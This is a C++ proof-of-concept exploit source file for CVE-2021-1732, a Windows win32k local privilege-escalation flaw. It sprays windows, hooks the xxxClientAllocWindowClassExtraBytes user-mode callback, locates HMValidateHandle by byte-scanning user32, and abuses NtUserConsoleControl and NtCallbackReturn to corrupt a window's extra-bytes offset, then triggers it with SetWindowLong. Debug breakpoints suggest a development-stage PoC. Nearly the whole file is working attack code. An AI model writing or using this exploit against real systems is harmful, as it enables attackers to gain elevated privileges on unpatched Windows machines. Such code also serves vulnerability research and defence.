// CVE-2021-1732.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <HookLib.h>

#pragma comment(lib, "Zydis.lib")
#pragma comment(lib, "HookLib.lib")

#define CLS_NAME	L"PO_WND_CLS"

#define WND_NAME L"PO_WND"

#define CALLBACK_INDEX			0x7B
#define TEB_DESKTOPHEAP_OFF		0x828
#define SPRAY_WND_COUNT			0x200
HWND SprayWndHandles[SPRAY_WND_COUNT];

using USERMODECALLBACK = VOID(WINAPI*)( ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4 );
USERMODECALLBACK UserModeCallback_Orig = NULL;

using NTUSERCONSOLECONTROL = NTSTATUS(WINAPI*)(ULONG_PTR CtrlCode, PVOID CtrlInfo, ULONG_PTR CtrlInfoLen);
NTUSERCONSOLECONTROL NtUserConsoleControl = NULL;


using  NTCALLBACKRETURN = NTSTATUS (WINAPI*)( IN PVOID OutputBuffer, IN ULONG OutputLength, IN NTSTATUS Status );
NTCALLBACKRETURN NtCallbackReturn = NULL;

using HMVALIDATEHANDLE = VOID* (WINAPI*)(HWND hwnd, int type);
HMVALIDATEHANDLE HMValidateHandle = NULL;

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}
	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

	HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

VOID WINAPI UserModeCallback_Proxy(ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4)
{
	ULONG_PTR ulConsoleInfo[0x2] = { 0 };
	ULONG_PTR ulRetBuffer[0x3] = { 0 };
	ULONG ulCurWnd = (ULONG)SprayWndHandles[SPRAY_WND_COUNT / 2];
	PVOID pCurWndObj = NULL;
	ULONG_PTR ulWndObjOff = 0x0;
	ULONG_PTR ulTebAddr = 0;

	ulTebAddr = __readgsqword(0x30);
	{
		USHORT usHigh = (ulCurWnd >> 0x10) & 0xffff;
		USHORT usLow = ulCurWnd & 0xffff;
		ulCurWnd = ((usHigh + 1) << 0x10) | usLow;
	}

	printf("UserMode Callback: %llx %llx %llx %llx\n", Para1, Para2, Para3, Para4 );
	printf( "Current window is Handle %X\n",  ulCurWnd);

	__debugbreak();

	pCurWndObj = HMValidateHandle((HWND)ulCurWnd, 0x1);					// window type fix 1
	ulWndObjOff = (ULONG_PTR)pCurWndObj - *(ULONG_PTR*)(ulTebAddr+ TEB_DESKTOPHEAP_OFF);
	printf("Current Window Object relative to DesktopHeap's offset:%X\n", ulWndObjOff);
	
	// trigle to change flag 
	ulConsoleInfo[0] = ulCurWnd;
	NtUserConsoleControl(0x6, (PVOID)&ulConsoleInfo, sizeof(ulConsoleInfo));

	ulRetBuffer[0] = ulWndObjOff;
	NtCallbackReturn(&ulRetBuffer, sizeof(ulRetBuffer), 0x0);


	// hook: call origin function, in this case, don't need, due to USER32!_xxxClientAllocWindowClassExtraBytes's internal call NtCallbackReturn
	//UserModeCallback_Orig(Para1, Para2, Para3, Para4);
}

BOOL RegistWndClass( PCTSTR ClsName ) {
	WNDCLASS wc = { 0 };

	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = ClsName;
	wc.cbWndExtra = 0x20;					// must specify, otherwise can't triggle xxxClientAllocWindowClassExtraBytes 
	return !!RegisterClass(&wc);
}

HWND CreateWnd( PCTSTR ClsName ) {
	return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, GetModuleHandle(NULL), NULL);
}

int main()
{
	HMODULE hWin32uMod = LoadLibrary(TEXT("win32u.dll"));
	HMODULE hWinNtdllMod = LoadLibrary(TEXT("ntdll.dll"));
	ULONG_PTR ulPebAddr = __readgsqword(0x60);
	PULONG_PTR pUserModeCallbackTable = *(PULONG_PTR*)(ulPebAddr + 0x58);

	__debugbreak();

	NtUserConsoleControl = (NTUSERCONSOLECONTROL)GetProcAddress(hWin32uMod, "NtUserConsoleControl");
	NtCallbackReturn = (NTCALLBACKRETURN)GetProcAddress(hWinNtdllMod, "NtCallbackReturn");

	FindHMValidateHandle();

	if (RegistWndClass(CLS_NAME) ) {
		for (int i = 0; i < SPRAY_WND_COUNT; i++) {
			SprayWndHandles[i] = CreateWnd(CLS_NAME);
		}
		printf("SprayWndHandles[%x] == %X \n", SPRAY_WND_COUNT / 2, SprayWndHandles[SPRAY_WND_COUNT / 2]);
		DestroyWindow(SprayWndHandles[SPRAY_WND_COUNT/2]);
		SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast<PVOID*>(&UserModeCallback_Orig));
		HWND hTargetWnd = CreateWnd(CLS_NAME);
		printf("hTargetWnd == %X\n", hTargetWnd);


		__debugbreak();
		SetWindowLong(hTargetWnd, 21, -1 );
	}
}